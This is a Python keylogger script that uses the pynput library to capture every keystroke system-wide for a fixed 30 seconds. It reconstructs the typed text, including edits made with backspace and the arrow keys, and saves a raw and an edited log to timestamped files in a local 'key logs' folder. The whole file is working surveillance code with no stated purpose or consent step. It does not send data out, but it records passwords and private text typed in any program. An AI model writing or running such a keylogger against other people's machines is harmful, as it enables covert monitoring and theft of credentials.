from pynput.keyboard import Key, Listener
import os
import datetime
import time
import sys

Timeee= 30        #in seconds 



all_text=''
total_text = ''
cursor_position = 0

def on_press(key):
    global total_text, cursor_position, all_text
    try:
        char = key.char
        all_text=all_text + char
        total_text = total_text[:cursor_position] + char + total_text[cursor_position:]
        cursor_position += 1
    except AttributeError:
        if key == Key.space:
            total_text = total_text[:cursor_position] + " " + total_text[cursor_position:]
            cursor_position += 1
        elif key == Key.backspace:
            if cursor_position > 0:
                total_text = total_text[:cursor_position-1] + total_text[cursor_position:]
                cursor_position -= 1
        elif key == Key.delete:
            if cursor_position < len(total_text):
                total_text = total_text[:cursor_position] + total_text[cursor_position+1:]
        elif key == Key.right:
            cursor_position = min(len(total_text), cursor_position + 1)
        elif key == Key.left:
            cursor_position = max(0, cursor_position - 1)

def on_release(key):pass
 
def writter():
    global total_text
    file_path= str(os.path.dirname(os.path.abspath(__file__))) 
    logs_directory = os.path.join(file_path, "key logs")
    os.makedirs(logs_directory, exist_ok=True)
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H_%M_%S")
    edit_path = os.path.join(logs_directory, f"Edited_{current_time}.txt")
    all_path = os.path.join(logs_directory, f"All_{current_time}.txt")

    with open(edit_path,'w') as file:
        file.write(total_text)
    with open(all_path,'w') as file:
        file.write(all_text)

def caller(times=Timeee):
    time.sleep(times)
    writter()
    sys.exit(1)    

if __name__ == "__main__":   
    with Listener(on_press=on_press, on_release=on_release) as listener:
        caller()        
        listener.join()
